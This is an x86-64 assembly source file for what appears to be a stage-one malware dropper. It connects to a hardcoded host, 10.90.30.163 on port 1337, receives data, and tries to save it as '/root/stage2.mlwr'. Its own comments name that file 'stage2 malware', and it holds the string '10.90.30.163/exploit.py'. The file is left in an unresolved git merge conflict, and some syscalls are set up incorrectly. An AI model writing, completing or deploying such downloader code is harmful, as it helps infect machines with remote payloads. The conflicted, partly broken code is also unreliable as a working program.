global _start

struc sockaddr_in
	.sin_family resw 1
	.sin_port resw 1
	.sin_addr resd 1
	.sin_zero resb 8
endstruc

section .bss
	sock resw 2
	client resw 2
	port resw 2
	bytes_read resw 2
	file_buff resb 8092
<<<<<<< HEAD
	stage2_fd resw 1
=======
	file_data resb 8092
>>>>>>> 9e41ea301cc54caa6998400473fe8083b93526c2

section .data
	file_name db '/root/stage2.mlwr', 0x0 ;null termination is necessary - will solve this later at time of sc conv
	;file_data db 'Hi I am stage2 malware', 0x0
	pop_sa istruc sockaddr_in
		at sockaddr_in.sin_family, dw 2
		at sockaddr_in.sin_port, dw 0x3905
		at sockaddr_in.sin_addr, dd 0xa31e5a0a
		at sockaddr_in.sin_zero, dd 0, 0
	iend
	sockaddr_in_len	equ $ - pop_sa
	

section .text

exit_gracefully:
	xor rax, rax
	add rax, 60
	mov rdi, 1
	syscall

_start:
	mov word [sock], 0
	mov word [client], 0
	mov word [port], 1234
	jmp main

_socket:
	xor rax, rax ;zeroed rax
	mov rax, 41 ;socket syscall no.
	mov rdi, 2 ;AF_INET
	mov rsi, 1 ;SOCK_STREAM
	mov rdx, 0 ;ANY_PROTO
	syscall
	
	;check if call succeeded
	;cmp rax, 0
	;jle _socket_fail
	mov [sock], rax ;save socket fd in sock variable
	
	ret

_connect:
	xor rax, rax
	mov rax, 42
	mov rdi, [sock]
	mov rsi, pop_sa
	mov rdx, sockaddr_in_len
	syscall

	ret
<<<<<<< HEAD
	
_fops:	
	xor rax, rax 
        mov rax, 2
        lea rdi, [file_name]
        mov rsi, 1
        mov rdx, 1
        syscall

        mov [stage2_fd], rax 

        xor rax, rax 
        mov rax, 1
        mov rdi ,[stage2_fd]
        lea rsi, [file_buff]
        mov rdx, 8092
        syscall
	
	ret
=======

print_data:
	mov rax, 1
	mov rdi, 1
	mov rsi, [file_data]
	mov rdx, 8092
	syscall
	call exit_gracefully
>>>>>>> 9e41ea301cc54caa6998400473fe8083b93526c2

_fcopy:
	mov rax, 45 ; recvfrom syscall no
	mov rdi, [sock] ; socket fd
	lea rsi, [file_buff] ; buffer to copy
	mov [file_data], rsi
	mov rdx, 8092 ; len to copy
	mov r10, 0
	mov r8, 0
	mov r9, 0
	syscall 
	mov [bytes_read], rax	

<<<<<<< HEAD
	mov rax, 1
	mov rdi, 1
	mov rsi, [file_buff]
	mov rdx, 8092
	syscall
	
	call _fops
	;loop _fcopy	
	
	ret
=======
	jmp print_data

	loop _fcopy	
>>>>>>> 9e41ea301cc54caa6998400473fe8083b93526c2

connect_to_site:
	
	;create socket
	call _socket

	;call connect API
	call _connect
	call _fcopy 

	call exit_gracefully
main:
	call connect_to_site
	siteurl: db '10.90.30.163/exploit.py', 0xa
